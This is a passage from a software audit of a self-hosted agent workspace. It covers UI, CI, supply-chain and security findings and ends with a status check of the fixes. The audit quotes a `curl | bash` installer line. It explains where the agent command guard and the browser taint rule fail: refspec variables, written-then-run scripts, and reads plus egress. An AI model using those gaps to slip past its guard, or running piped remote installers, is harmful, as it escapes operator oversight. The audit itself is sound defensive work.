`<Notice kind>` component, and add one app-level toast region for transient results (copied, saved, undo).

- **F-24.** Destructive confirm built two ways; `useConfirm.tsx:63-70` has the only ad hoc hex outside the terminal theme (no `--color-on-fail` token); danger hover is `text-wait` nearly everywhere but `text-fail` for force push.
- **F-25.** The terminal ignores the theme tokens: `theme.css` sets `--color-term: #0a0a0a`, `Terminal.tsx:480-502` hardcodes `#0b0e12` and a system font stack instead of `--font-mono`. Reading tokens at construction is also the seam the light-theme backlog item needs.
- **F-26.** The mono uppercase section label is implemented five times with different tracking.
- **F-27.** Emoji and fallback glyphs where the app elsewhere removed them on purpose (`Docs.tsx:129`, `BrowserPane.tsx:241`, text glyph buttons for close and download although `Icon.tsx` exists).
- **F-28.** One loading state is still text (`SearchPanel.tsx:208`).

### UX

**F-29. API errors that are not transport errors are invisible on most screens.** Medium. Of about 40 `usePoll` call
sites outside chat, two read `error`. When `/api/projects` answers 500, Hub shows "Projects 0". `usePoll` also keeps hitting
a failing path at full rate. Fix: a `<PollError error retry>` row and exponential backoff on consecutive errors.

**F-30. Destructive actions without confirm or undo.** Medium. `Settings.tsx:209` "clear" deletes a stored credential
immediately; `:379` disconnects Google; `:484` adding a blocked owner removes what was filed before; loop close and run
dismiss on Today and Inbox. The rest of the app confirms, so the gap is inconsistent rather than systemic.

**F-31. The Inbox undo bar is in normal flow at the top of the list.** Medium. `Inbox.tsx:664-674`: marking the 30th row
done shows nothing on screen and the 15 s timer expires unseen. Render it in the toast region from F-23.

**F-32. No optimistic updates in the Inbox.** Medium. Two round trips per triage tap over WireGuard; "clear N" is N
sequential POSTs and leaves a partial result if the phone sleeps. Remove the row locally and roll back on error; add a
bulk `POST /api/feed/state`.

**F-34. View state is not in the URL, and scroll is not reset on navigation.** Medium. Project tab, Session pane and
side, the open file, Inbox filters and the open document are `useState`. iOS evicts a backgrounded PWA often, so a reload
returns to the default pane. The Docs comment claims a document "is a link somebody can be sent", which is not true for
`open`. Settings does it right. Fix: `useSearchParams`; a `ScrollToTop` that fires on PUSH only.

- **F-33.** Banners cover navigation: UpdateBanner sits on top of the phone tab bar, ConnectionBanner covers the back arrow while offline.
- **F-35.** The command palette cannot be opened on a phone (Cmd/Ctrl+K only) and knows only projects and live sessions. It is the natural home for a global search.
- **F-36.** Repo search results cannot jump to the matched line (`SearchPanel.tsx:236` drops `h.line`).
- **F-37.** Inbox "yes"/"no" answer a prompt the user has not seen (`WaitingSession.tsx:22, 68-81`): output is collapsed by default while "yes" sends `y` plus Enter. Same hazard as C-03. Show the parsed dialog from `tui-prompt.ts` first.
- **F-38.** The file tree loses its expansion state on a side switch and has no tree semantics or arrow-key handling.

### Accessibility

- **F-39.** Tap targets under 44 px outside the four routes the e2e suite measures: GitPanel row actions (discard sits beside stage), SearchPanel toggles, BrowserPane nav, ReviewOverlay verdict buttons, the Project tab strip, Session menu kill and delete, the blocked-owner "x" (about 8 px wide). Extend `smallButtons()` to the other routes and to width.
- **F-40.** Icon-only controls named only by `title` (the accessible name is "+", "-"), toggles without `aria-pressed`, disclosures without `aria-expanded`, and about 17 inputs with placeholder-only labels. `jsx-a11y/control-has-associated-label` is off, so lint cannot see them. A shared `Field` with a required `label` prop fixes this for good.
- **F-41.** Contrast failures from using border tokens and opacity for text: `Inbox.tsx:620` at about 1.6:1, `Terminal.tsx:950, 992`, `Today.tsx:753` at about 2.2:1 as the only "not set up" signal.
- **F-42.** `animate-pulse` and hover translate are not covered by the reduced-motion rule (`theme.css:347-355`). Use `motion-safe:`.

### PWA

**F-43. A notification click reloads the app instead of routing inside it.** Medium. `sw.ts:63-68` calls
`client.navigate(url)`, a full document navigation that drops the terminal websocket, the SSE stream and any unsaved draft,
even when the app is already on that session. The push handler also notifies when the app is visible on the very session it
is about. Fix: `client.postMessage({type: "navigate", url})` handled in `App.tsx`; skip `showNotification` when a visible
client is already there.

- **F-44.** The offline shell is missing its fonts (no `woff2` in the precache list), and the push subscription can go stale silently: no `pushsubscriptionchange` handler and no check that the server still holds this endpoint after a volume restore.
- **F-45.** Manifest gaps: one icon with combined `"any maskable"` purpose, no `launch_handler`. Nothing on Today or Inbox says push is off on this device, though the whole "needs you" loop depends on it.

### Maintainability, tests, features

- **F-46.** Seams: `Session.tsx` (1273): the file viewer is self-contained and duplicates CodeOverlay; `ICONS/PaneIcon` duplicates `Icon.tsx`; two splitters are the same widget twice. `Terminal.tsx` (1005): `useTerminalSocket`, `KeysBar`, `AuthLinkBar`, dictation. `Settings.tsx` (1088): six panels in one file.
- **F-47.** Small duplicates: three byte formatters, the status-to-chip ternary twice, `OUTCOME` maps twice, raw `fetch` for uploads bypassing `api()` (no timeout, no reachability report), project names unencoded in most URLs. No `any`, no redefined wire types, no dead handlers found.
- **F-48.** Test gaps in order of value: a per-tick test for F-01; Terminal with a fake WebSocket (reconnect keeps the buffer, font change sends resize, 4404 stops retrying); the file viewer backdrop with a dirty draft; SchedulesPanel posts the visible project; a failed Settings save keeps the draft; an e2e with `setOffline(true)`; an axe-core pass per route in the existing e2e run.
- **F-49.** Feature gaps tied to what the app already tries to do: global search across sessions, inbox and docs; a keyboard shortcut sheet; session filter, sort and bulk delete on Project; first-run guidance toward Settings before the first clone fails; source health on the phone (the Sources column is hidden below 1000 px). Light theme is tracked.

---

## Part 6: Build, container, CI, dependencies, docs

Deployment manifests are not in this repo; they live in `mortennordbye/Homelab` under `k8s/talos/apps/verksted/` and were
read through `gh api`. The GitHub repo is public.

### High

**O-05. Dependabot minor and patch updates auto-merge with no cooldown and flow to a pod holding every credential.** High.
`dependabot-auto-merge.yml:42-43` merges anything not semver-major; npm minors and patches are grouped (PR 167 merged 11
updates at once; the lockfile has 893 packages). The only gate is the `test` job. No e2e, no scan. Main then builds and tags
an image that gets promoted. Fix: a `cooldown` of about 7 days per ecosystem, auto-merge `devDependencies` only, and make
e2e a required check first.

**O-06. Agent CLIs and two installers are unpinned, and the layer cache makes their version arbitrary.** High. Confirmed.
`Dockerfile:60-61` `npm install -g @anthropic-ai/claude-code @openai/codex` with no versions; `:78-79` pipes the uv
installer; `:125` `curl ... antigravity.google/cli/install.sh | bash`. With the gha layer cache the shipped CLI version is
neither pinned nor fresh. `dependabot.yml:1` claims "nothing moves without a PR", which is not true for these three. This
also matters for C-03 and `tui-prompt.ts`: the scrape is pinned to a CLI layout that can change under it without a PR. Fix:
`ARG` versions, release artifacts with a sha256 check, bump by PR.

**O-12. `make run` and compose publish a no-auth root shell on all host interfaces.** High. Confirmed.
`Makefile:37`, `docker-compose.yml:25, 39`, `vite.config.ts:64` `host: true`. Docker publishes on 0.0.0.0, the app has no
auth by design, and requests without an Origin are admitted, so anyone on the laptop's LAN can create sessions and attach
terminals with the `.env` credentials. Fix: bind `127.0.0.1:` in all three places, overridable for deliberate LAN use.

**O-01 and O-02.** The backup timer and its silent failures: see R-02 and R-03.

### Medium

- **O-03.** Backup target and primary volume share one NAS; no offsite copy or restore drill is recorded. The PVC is `syno-nfs-csi` and `VK_BACKUP_DIR` is a subPath of a share on the same Synology. Document where the NAS copy goes offsite, run `vk restore` into a scratch volume once and record it, add a short RUNBOOK (restore, roll back an image, rotate tokens).
- **O-04.** Backup encryption docs contradict themselves (`README.md:112-115` says archives are written encrypted with a passphrase, `:138-139` says "the archive is not encrypted"; SANDBOX.md agrees with the latter), and the pod manifest sets no `VK_BACKUP_PASSPHRASE`, so archives on the shared NAS are presumably cleartext and hold every token.
- **O-07.** Base images are pinned by tag, not digest; model and binary downloads (whisper from a mutable HF branch ref, Kokoro, yq, helm) have no checksum.
- **O-08.** The container runs as root and the Deployment sets no `securityContext`. The privileged dind sidecar already makes the pod node-root equivalent, so this is defence in depth, and it is the prerequisite for S-04(c), S-05 and S-08.
- **O-09.** Playwright pin parity: `Dockerfile:70` and `backend/package.json:20` both say 1.63.0 today, and nothing keeps it that way. Dependabot will bump `playwright-core` as a minor and auto-merge it while the Dockerfile line is invisible to it. Fix: a vitest that asserts the two strings are equal, or a build ARG read from `package.json`.
- **O-10.** Most Dockerfile pins are invisible to any updater: whisper.cpp, `@playwright/mcp`, kubectl, the Kokoro pip pins, yq, helm, `docker:29-dind` in compose. Move pip pins to a requirements file and add the `pip` and `docker-compose` ecosystems.
- **O-11.** Layer order: `COPY runtime/...` (`Dockerfile:138-157`) sits in front of the ffmpeg, whisper, Kokoro and tools layers, and `verksted-mcp.mjs` alone had 23 commits since August. Each one rebuilds and re-downloads everything after it. Move the runtime COPYs to the end of the `base` stage.
- **O-13.** Actions are pinned by major tag, not SHA, while two jobs hold `packages: write` and `contents: write`.
- **O-14.** No vulnerability or static scanning: CodeQL is not configured (free on a public repo), no trivy on the image, no SBOM or provenance.
- **O-15.** The browser e2e suite (22 tests) runs only by `make e2e`, not in CI. Tracked (BACKLOG.md:258, :488). Do it before widening auto-merge.
- **O-19.** Every merge redeploys with `strategy: Recreate` and kills every tmux session; restore exists for claude only. Batch promotions, or skip image builds for docs-only changes with `paths-ignore`. Partly tracked.
- **O-24.** The websocket bridges have no behavioural tests, including the detach-never-kill invariant CLAUDE.md calls the core feature. One test with the existing fake-bin helper: open, close, assert the attach client died and no `kill-session` ran.
- **O-30.** 2,100 lines of shipped runtime code get no lint, typecheck or shellcheck: `eslint.config.js` ignores `runtime/**`, `verksted-mcp.mjs` has no `// @ts-check`, and `vk`, `vk-guard`, `vk-signoff` are never shellchecked although shellcheck is in the image. These are the files S-04 and A-10 live in.
- **O-32.** The system-wide `core.hooksPath` silently disables project hooks other than `commit-msg`, a repo-local husky `core.hooksPath` overrides the stripper entirely (unverified in the pod), and the attribution patterns match `claude` only while the header claims codex and agy.
- **O-34.** README and SPEC drift: Node 22 everywhere versus `node:24-trixie-slim` in the Dockerfile and CI; "gemini" in six places after the decision log replaced it; "all secrets flow through External Secrets Operator" though credentials live in `settings.json` on the PVC; "tree is browse/view only" though there are PUT, upload, replace, commit and push routes; "three levels, no chat UI".
- **O-37.** BACKLOG.md is healthy for product gaps but: the entry at `:538-558` defers a commit-msg hook that has since shipped; `:100-128` and `:208-218` are blocked on a deployment that has existed for months; ten entries are "verify X in the pod" tasks that need an afternoon, not code; `:274` is out of date about test counts; "The chat view is polled" gives the wrong interval; there are no dates; and none of the infrastructure findings above appear in it.

### Low

- **O-16.** The Actions cache is at 8 GB of the 10 GB cap (388 caches, `mode=max`); LRU eviction will start discarding the expensive layers. Use a registry cache.
- **O-17.** No retention for GHCR images (tag 0.0.397 is live).
- **O-18.** The ruleset allows admin bypass and does not require a PR; the auto-merge workflow's safety comment leans on it.
- **O-20.** Image tags come from `github.run_number`; renaming the workflow resets the counter and Kargo's newest-semver selection would never pick a new build.
- **O-21.** Single-arch image; `make build` on Apple Silicon yields an arm64 image the cluster cannot run. Document or add `--platform`.
- **O-22.** No HEALTHCHECK, and the health route is a constant. See R-28.
- **O-23.** The build stage compiles node-pty twice.
- **O-25.** No test reaches `/api/usage`, `/api/maintainer`, `/api/loops`, `/api/runs`, or `cache.ts`.
- **O-26.** No coverage measurement. Report-only `make coverage`; thresholds only on `paths.ts`, `origin.ts`, `vk-guard`.
- **O-28.** Fixed sleeps in e2e (`waitForTimeout(300|500)` in seven places) will flake on a cold CI runner.
- **O-29.** TypeScript strictness stops at `strict`. `noUncheckedIndexedAccess` in the backend first, where transcripts and gh output are parsed.
- **O-31.** No `make format`, `make audit` or pre-commit hook, and npm must not run on the host.
- **O-33.** `.env.example` versus `env.ts`: `STATIC_DIR` is missing from the example; `LOG_LEVEL` and `DOCKER_HOST` are read raw outside `env.ts`; directory vars are not checked for existence or writability at startup, so fail-fast covers formats only; the backup variables sit under "notifications".
- **O-35.** CLAUDE.md's directory layout lists 17 of 50 backend source files and 5 of 25 route files, omits `origin.ts` and `exec.ts` (security surfaces an agent should be pointed at), says `make lint` is tsc only and Node 22.
- **O-36.** ASSISTANT.md and ASSISTANT-V2.md split authority over 1,941 lines, and V2's status is "built and merged", so it is now history. Fold the still-true runtime and safety sections into SPEC.md and move both to `docs/history/`. Fix the safety section while doing so: A-01 shows it no longer describes the code.
- **O-38.** Public repo without SECURITY.md. For a no-auth root shell by design, a 20-line statement of the WireGuard-only threat model is the one community file worth having.
- **O-39.** Stray root files: `mock-inbox.html` (47 KB) is referenced only from BACKLOG. Move both mocks to `design/`.
- **O-40.** Node is pinned in four places with no `engines` field; Node 26 becomes LTS on 2026-10-28. Tracked (BACKLOG.md:683).
- **O-41.** PR 168 (`imapflow` 1.7.8 to 2.0.2) has been red since 2026-09-16 with three TS2345 errors in `mail.ts`; nobody owns it.
- **O-42.** `make setup` uses `npm install`, so a newcomer's first command can rewrite the lockfile.

---

## Part 7: Structural changes that make it hold up over time

The findings above cluster into eight root causes. Fixing the root removes many findings at once and stops the class from
coming back.

**1. Privilege separation on the pod.** Everything runs as root under one uid, so the proposal "tap", the mail and agent
secret split, the 0600 modes and `vk-guard` are conveniences rather than boundaries. Run agents (and Chromium) as an
unprivileged user that cannot read the backend's files; require a per-boot secret on the handful of routes that matter
(`do`, `reveal`, settings writes, ssh keys, session create). Covers A-01, A-06, S-04, S-05, S-08, O-08.

**2. Tool policy as data, enforced by the server.** One table beside the MCP tool definitions:
`{ unattended, chairOnly, private, effect: read | reversible | card }`, plus a taint rule ("after a tool that returns outside
text, writes become proposals and the browser closes"). Today this lives in four lists, tool descriptions, the persona and
stale comments. Covers A-01, A-02, A-03, A-05, A-07, A-08, A-09, A-29. Add an audit log and undo on top (A-31).

**3. One JSON directory store.** Five stores hand-roll read, get and write. One `JsonDirStore` with a per-key write queue,
a shape guard, a `v` field, atomic writes with fsync, and skip-and-log on a bad file. Covers R-05, R-09, R-11, R-16, R-17,
R-18, R-31, A-19.

**4. A background sweeper, a retention policy, and cached liveness.** GET handlers currently sweep, measure, backfill
and poll. Move that to one background job; cache `tmux ls` and the meta scan for a second; archive old sessions and quiet
feed items; run housekeeping on croner, not on boot-relative intervals. Covers R-01, R-02, R-06, R-07, R-08, R-10, R-20, R-33.

**5. One error and version contract.** A global Fastify error handler with one `{ error }` shape, a redacting log
serializer, a real readiness endpoint, a build id in a response header with a client reload prompt on mismatch, and basic
metrics (event-loop lag, exec failures, timer failures, queue depths). Covers S-03, R-23, R-27, R-28, F-29.

**6. UI primitives from a component library.** Radix or shadcn `Dialog`, `Button`, `Field`, `Tabs`, a toast region and a
`Notice`. This is what CLAUDE.md already asks for. Covers C-17, C-18, C-19, C-27, F-21, F-22, F-23, F-24, F-31, F-40, and
most tap-target and label findings, and makes them impossible to reintroduce per screen.

**7. Chat as hooks plus one composer.** `useAssistantThread` (socket, reconnect, post, queue), `useSessionChat`
(incremental, upsert by id), `useStickToBottom`, `useReadAloud`, and one `Composer`. On the server: delta frames for the
assistant, an incremental parsed index for transcripts. Covers C-01, C-02, C-05 through C-10, C-13, C-14, C-21, C-22,
C-25 and makes each of them unit-testable.

**8. Supply chain and CI gates.** Pin CLIs, installers, base digests and actions; add a cooldown and restrict auto-merge;
run e2e, CodeQL and an image scan in CI; lint and typecheck `runtime/`. Then keep auto-merge. Covers O-05 through O-07,
O-09, O-10, O-13 through O-15, O-30.

---

## Part 8: Suggested order of work

**Week 1: stop the bleeding (all small).**
R-01 (port pool, about a week of runway), A-04, C-04, C-03 and F-37, F-04, F-05, O-12, S-03 with the global error handler
(also R-27), S-01, S-06, R-02 and R-03, C-07, F-01 together with R-06, A-13, A-16, R-16, C-24.

**Weeks 2 to 3: assistant safety and chat resilience.**
A-01 (browser taint rule and loopback block), A-02, A-03, A-05, A-07, A-10, the tool policy table (A-29), the audit log
(A-31). C-01, C-02, C-05, C-06, C-08, C-10, C-13, C-16 through the hooks in root cause 7. S-02, S-07, S-10, S-11, S-12. Pin
the tests listed in A-32 and C-38 as each fix lands.

**Month 2: consistency at scale.**
The JSON directory store (root cause 3), the sweeper and retention (root cause 4), scheduler fixes R-04, R-12 through
R-15, R-19. UI primitives (root cause 6) rolled out screen by screen, starting with Sheet and the chat. F-02, F-03, F-07,
F-13, F-14, F-15, F-34, F-43. CI gates (root cause 8). Docs pass: O-04, O-34, O-35, O-36, O-37, O-38.

**Quarter: the structural one.**
Privilege separation (root cause 1): a `vk` user for the backend, a separate user for agents and Chromium, a NetworkPolicy
for unattended stages, `securityContext` in the Deployment. Then the restore drill and runbook (O-03), attended budgets
and per-thread cost (A-26), undo for mail and calendar actions (A-08, A-09), and the chat feature set in C-30.

---

## Part 9: Done well

Worth saying, because the audit above is a list of faults in a codebase that gets most things right.

- **Command execution.** Every external command is `execFile` with an argv array. No shell string and no client input interpolated anywhere. `--` before client paths, `GIT_LITERAL_PATHSPECS=1`, `git check-ref-format --branch` before a branch reaches git, strict repo URL patterns, digit-only ids, `send-keys -l --`.
- **Path scoping.** `paths.ts` is realpath-based, denies `.git` on the resolved path, refuses a symlinked project dir, and is well pinned by tests. The gaps in S-07 are at the write leaf only.
- **The Origin check** is a global hook that covers every mutating method, websocket upgrades and SSE, rejects `Origin: null`, and is tested including the body-less simple-POST case. No CORS headers, no cookies.
- **Secrets on the wire.** Settings values are write-only with fingerprints, reveal is an origin-checked POST, the file is 0600 and atomic, and the `EXEC_KEYS` allowlist keeps settings vars from steering binaries the backend runs.
- **Schemas.** Body schemas with `additionalProperties: false`, max lengths and capped arrays on essentially every route. Every store validates ids before building a path.
- **Repo content is never served as active content**: extension allowlist, `nosniff`, `default-src 'none'`, sanitised filenames; HTML and SVG excluded from inline types.
- **Reliability groundwork.** "tmux unreachable" is kept apart from "nothing running" everywhere, so an outage never ends sessions or fires pushes. Metadata is written before tmux starts and a failed launch rolls back. croner runs with a validated timezone and `protect`. Missed ticks are caught up within a bounded window. The reaper refuses to end sessions holding unpushed work. tini is PID 1. SIGTERM is handled. The attach socket detaches and never kills.
- **`usePoll`.** A generation counter against out-of-order replies, 404 as an answer, a build-keyed persisted cache with a size cap and quota catch, visibility-aware timers, the `fresh` flag.
- **Mobile ergonomics are unusually thorough**: tap utilities, safe-area insets, `dvh` plus visual viewport plus a keyboard variant, 16 px inputs instead of banning zoom, the terminal key bar, image upload as paste, `useDismissOnBack` with its races handled and tested.
- **Client security posture**: react-markdown without rehype-raw, the only `dangerouslySetInnerHTML` is escaped hljs output, HTML documents shown as extracted text, external links carry `noreferrer`.
- **Build and CI.** Multi-stage with build-time self-tests (a real Kokoro synthesis, `whisper-cli --help`, `agy --version`), the image is booted and curled before it is pushed, read-only default workflow token, thoughtful dependabot ignores, secret scanning and push protection on, zero open alerts, attribution enforced at two layers.
- **Tests.** 841 backend tests against 20.5k source lines, with real `rg`, fake-bin helpers, path traversal and guard suites, real-pane fixtures for the TUI scrape. ESLint is type-aware with `no-floating-promises`, and every disabled rule has a written reason.
- **Comments explain why.** Nearly every timer, cap and odd choice carries its reason. That is what made this audit possible in a day, and it is also why several findings are "the comment says X, the code now does Y": the comments are the spec, and a few have been overtaken.

---

## Part 10: Status check, 2026-09-23

Every finding above was checked against `main` at `01c2e97`. The check ran as six read-only reviews, one per part
(Parts 6 and 7 together), each reading the current code and not trusting comments or commit subjects. Most
commits do not name the IDs they fix, so the verdicts come from the code.

Verdicts: **fixed** (the problem is gone), **partial** (some of it remains, said below), **open** (still as
described), **not code** (what is left needs the pod, the NAS or Homelab, not this repo).

| Part                | Findings | Fixed | Partial | Open | Left only on the pod |
| ------------------- | -------- | ----- | ------- | ---- | -------------------- |
| 1 Assistant backend | 32       | 25    | 7       | 0    | A-01 (b), (c)        |
| 2 Chat view         | 38       | 35    | 3       | 0    |                      |
| 3 Security          | 13       | 8     | 2       | 0    | S-04 (b), S-05       |
| 4 Reliability       | 35       | 29    | 6       | 0    |                      |
| 5 Frontend          | 49       | 43    | 6       | 0    |                      |
| 6 Build, CI, docs   | 42       | 35    | 2       | 0    | O-03, O-04, O-08     |
| 7 Structure         | 8        | 3     | 5       | 0    | P7-1                 |

None of the gaps below had a BACKLOG.md entry when this was written.

### Bugs still in the code

- **R-19.** The GitHub poller's error item still uses `feed.upsert` with a message-based version
  (`pollers.ts:612-621`) and is resolved on success (`:585`). The same error coming back later stays done and
  never reaches the inbox again. Mail and calendar use `feed.refile`; this one should too.
- **R-31.** Schedules, loops and the feed parse with an `as T` cast and no shape check. A `{}` or `null` file
  throws in the sort (`schedules-store.ts:195` `a.createdAt.localeCompare`, `feed-store.ts` `list`
  `b.at.localeCompare`) and takes that store's whole list down. Only sessions have a guard (`isMeta`).
- **R-13 (residual).** A full unattended queue throws `BusyError` from `runUnattended`, and the assistant-jobs
  callers (`assistant-jobs.ts:153-176`) do not catch it, so the reserved ceiling slot is never handed back.
- **R-04 (residual).** In `stageRun` (`scheduler.ts:340-353`) the worktree exists before its session does. For
  the whole of `claimIssue` (gh, up to 60 s), `stagePrompt` and `createSession`, a done earlier build session
  with the same worktree name is not in `held`, so a watcher tick in that window can remove the new tree.
- **S-08 (repo half).** `validNavUrl` (`browser.ts:32-44`) accepts any http(s) host, so the session browser can
  open `127.0.0.1`, link-local addresses and cluster services. This part does not wait on the agent user.
- **S-10 (not in the audit).** `GIT_CONFIG_PARAMETERS` and the other `GIT_CONFIG_*` names are not on the
  settings blocklist (`settings-store.ts:93-114`). Session launch overwrites `GIT_CONFIG_COUNT`/`KEY_0`
  (`session-launch.ts:139-141`), but `GIT_CONFIG_PARAMETERS` would reach every session's git.
- **F-29.** Backoff is everywhere, but Settings (`/api/settings`), Session (tree, git), SchedulesPanel, PrPanel,
  ActionsPanel, MemoryPanel, CommandPalette and Docs search still ignore `error`, so a 500 reads as empty.
- **F-39, F-40.** The blocked-owner `×` (`BlockedOwners.tsx:80`) has `tap` (height only) and no padding, about
  8 px wide, and its accessible name is "×" (a `title`, no `aria-label`). The e2e width check
  (`narrowGlyphButtons`, `smoke.test.ts:687`) names this button but only runs on `/p/demo` and `/runs`.
- **O-06 (docs).** The header of `.github/dependabot.yml` says nothing moves without a PR, which is not true
  of agy.

### Part 1: assistant backend

Fixed: A-02 to A-26, A-29, A-30 (A-02 `verksted-mcp.mjs:895-976`; A-04 `assistant-policy.ts:335`; A-06
`assistant-policy.ts:52-60, 104-118, 173-216`; A-13 `assistant-turn.ts:289`; A-14 `assistant-turn.ts:363,
579-587`; A-15 `assistant-turn.ts:83-97`; A-20 `routes/assistant.ts:83-93`; A-29 one `POLICY` table checked by
`assistant-tools.test.ts:511`).

- **A-01, partial.** (a) is done: `assistant-taint.ts` and `ws/assistant-browser.ts:22-45` close the chair's
  browser after a private read, and refuse a private read after browsing. (b) and (c) depend on
  `agent-gate.ts:31`, a no-op without `VK_AGENT_USER`: the assistant's chromium can still reach
  `127.0.0.1:<PORT>` and cluster services. No `--host-resolver-rules`, no per-boot secret. `IMAP_PASSWORD` and
  the other source keys can still be revealed (only `GOOGLE_REFRESH_TOKEN` is excluded).
- **A-27, partial.** Retention is in (`assistant-retention.ts`), but `search` and `listThreads` still parse every
  thread file (`assistant.ts:204-225, 554-588`); the cache holds 4 threads.
- **A-28, partial.** Policy, turn runner, taint, stream and usage are split out; meetings and unattended runs
  are still in `assistant.ts` (1922 lines), and hold-convene-then-close is still written twice
  (`runChair` `:1250/1543`, `unattendedTurn` `:1829/1841`), the duplication A-04 came from.
- **A-31, partial.** Tool log, undo, tiers, cost, export, fenced outside text and hidden HTML are done. Left:
  speech to text is English only (`transcribe.ts:23`, `ggml-base.en.bin`); no injection regression suite with
  canary mails against a real model; no server-side thread compaction, only the "getting long" notice.
- **A-32, partial.** Most tests exist. Missing: a turn hitting `TURN_TIMEOUTS`, ended through `endTree` and
  reported; stop pressed between a held convene reply and its append.

### Part 2: chat view

Fixed: C-01 to C-05, C-07 to C-29, C-31 to C-34, C-36 to C-38 (C-02 `useSessionChat.ts` `merge`; C-03
`LivePrompt.tsx:98-128`; C-17 `Dock.tsx`; C-19 `role="log"` in `Room.tsx:429`, `ChatPane.tsx:469`; C-22 one
`chat/Composer.tsx`; C-38 tests for all five suggested cases).

- **C-06, partial.** The 3 s poll is answered from a stat cache (`chat.ts:686-700`). `findImage`
  (`chat.ts:1077-1081`) and `findDetail` still `JSON.parse` every line, base64 included, before checking `ref`.
- **C-30, partial.** Copy, retry, thread search, rename, export, drag and drop and a lightbox are in. Missing:
  syntax highlighting in chat code blocks, a copy button per code block, edit and resend, search inside the
  open thread.
- **C-35, partial.** Two `ToolChip`s (`Room.tsx:84`, `chat/ToolChip.tsx`); `EFFORTS` twice
  (`AssistantPanel.tsx:29`, `CouncilPanel.tsx:28`); user-bubble markup four times with two size sets
  (`ChatPane.tsx:180, 525` vs `Room.tsx:400`, `Chat.tsx:563`).

### Part 3: security

Fixed: S-01 (`origin.ts:79-90`, `app.ts:110-114`), S-02 (`Share.tsx:38-84`, `frame-ancestors 'self'`), S-06
(helmet, `app.ts:160-195`), S-07 (`writeNoFollow`, `leafInsideRepos`, `GIT_NO_REPO_CODE`), S-09 (rate limits,
ceilings, disk checks), S-10 (blocklist, but see above), S-11 (`ssh.ts:113-126`), S-12 (`push.ts:114`,
`app-path.ts`), S-13 (redaction, `maxPayload`).

- **S-03, partial.** Errors are redacted (`exec.ts:20-32, 82-84`) and 5xx answers say "internal error". The
  secrets still reach tmux as `-e KEY=VALUE` (`tmux.ts:80, 118`, `ws/attach.ts:75`), readable in
  `/proc/*/cmdline`; BACKLOG accepts that once the agent user is on. The redaction only matches names with
  TOKEN, SECRET, PASSWORD, PASSPHRASE, CREDENTIAL, `_KEY` or APIKEY.
- **S-04, not code.** `vk-guard` is rewritten and tested (`vk-guard.test.ts`). What is left is what no lexical
  guard can do (variables in refspecs, scripts written then run, reads plus egress); it needs the agent user
  and an egress NetworkPolicy.
- **S-05, not code.** Documented as a convenience (`SECURITY.md:35-38`); the boundary is the uid check in
  `agent-gate.ts:109-114`, off on the pod.
- **S-07 residual.** pull, push and fetch run with the full `process.env` (`files.ts:799, 841, 867`); repo
  config such as filter drivers or `core.sshCommand` runs as root until the agent user is on.
- **S-08, partial.** Chromium runs as the agent user when one is set (`browser.ts:127-160`); on the pod it is
  root with `--no-sandbox` and per-session CDP ports. The URL filter is above.
- **S-12 residual.** Push endpoints may be any `https://` host (`push.ts:14`); the optional allowlist was not
  done.
- **S-13 residual.** `GET /api/cluster` is still a plain GET (the Host check now blocks rebinding); the shared
  ServiceAccount token is RBAC.

### Part 4: reliability

Fixed: R-01, R-03 to R-07, R-09 to R-18, R-20 to R-27, R-29, R-30, R-32 to R-34 (R-05 `seq.json`; R-11
`keyedQueue`; R-12 waits by schedule; R-18 `atomic-json.ts` syncs; R-23 `index.ts:137-154`; R-25 `paced`; R-26
pty pause and resume; R-34 the split in #264).

- **R-02, partial.** Backups and the feed jobs run on croner with a boot catch-up; the docker prune is still a
  24 h `setInterval` from boot (`maintenance.ts:130-141`), accepted in a comment.
- **R-08, partial.** Metas and sidecars archive at 90 days (`session-reaper.ts:134-158`). `plan.jsonl` gains a
  line an hour forever (`plan.ts:193`); closed loops, transcripts and the monthly archives are never pruned.
- **R-17 residual.** `browser-mcp.sh` is a plain `fs.writeFile` on every launch (`claude-hooks.ts:155`).
- **R-19, R-31, R-13, R-04.** See "Bugs still in the code".
- **R-28, partial.** `/api/health` carries the build, `/api/ready` exists, the service worker offers a reload.
  No metrics endpoint, no `x-vk-build` header, and the build id is the frontend hash, not the git SHA.
- **R-35, partial.** Most named tests exist. `startMaintenance`, `startNotifier`, `startPollers`, `startWatch`
  and `startFeedWork` return no stop handle; no literal test with more than 200 ended metas.

### Part 5: frontend

Fixed: F-01 to F-22, F-24, F-25, F-28, F-30 to F-38, F-40 to F-44, F-46 to F-49 (F-01 `events.ts:51-56`; F-02
`Terminal.tsx:581, 607, 664`; F-22 `ui/Overlay.tsx`; F-34 search params and `HashScroll.tsx`; F-35 palette button
`TopBar.tsx:205`). F-43 still shows a notification when the app is open on that session, on purpose: iOS
requires one per push.

- **F-23, partial.** Bare error lines with no `role="alert"`: `Docs.tsx:83`, `BrowserPane.tsx:333`;
  `CouncilPanel.tsx:345` hand-rolls its box; `assistant/Month.tsx:88`.
- **F-26, partial.** The mono label is a utility; the sans uppercase label is pasted six times with two
  tracking values (`Hub.tsx:60, 85, 133`, `UsagePanel.tsx:40`, `ClusterPanel.tsx:40`).
- **F-27, partial.** Text glyphs as controls: `BlockedOwners.tsx:82`, `Today.tsx:186, 712` (×),
  `BrowserPane.tsx:233, 241` (←, →), `TopBar.tsx:22` (←).
- **F-29, F-39.** See "Bugs still in the code".
- **F-45, partial.** Manifest done; nothing on Today or Inbox says push is off on this device.

### Parts 6 and 7: build, CI, docs, structure

Fixed: O-01, O-02, O-07, O-09 to O-42 except as below (O-07 digests on every `FROM`; O-13 actions pinned by SHA;
O-14 CodeQL, trivy, SBOM, provenance; O-15 e2e required; O-18 ruleset with no bypass; O-24
`attach-ws.test.ts:106-134`; O-36 ASSISTANT-V2.md gone). P7-2, P7-4, P7-7 fixed.

- **O-03, O-04, O-08, P7-1, not code.** Tracked in BACKLOG.md (offsite copy, backup passphrase, agent user).
- **O-05, partial.** Cooldowns and required checks are in, but `dependabot-auto-merge.yml` still merges every
  non-major, runtime dependencies included (the agent CLIs group can change the TUI `tui-prompt.ts` reads). The
  audit asked for devDependencies only; no decision to keep it is written down.
- **O-06, partial.** agy is still unpinned (BACKLOG, upstream); the dependabot.yml header is above.
- **P7-3, partial.** `atomic-json.ts` and `serial.ts` are shared, but there is no one `JsonDirStore`:
  `readJsonDir` casts, records carry no `v`, and a bad file is skipped without a log line.
- **P7-5, partial.** Error handler, serializers, `/api/ready` and the update banner are in; none of the
  proposed metrics (event-loop lag, exec failures, timer failures, queue depths).
- **P7-6, partial.** `components/ui/` exists, but `Chat.tsx`, `ChatPane.tsx` and `components/chat/*` import
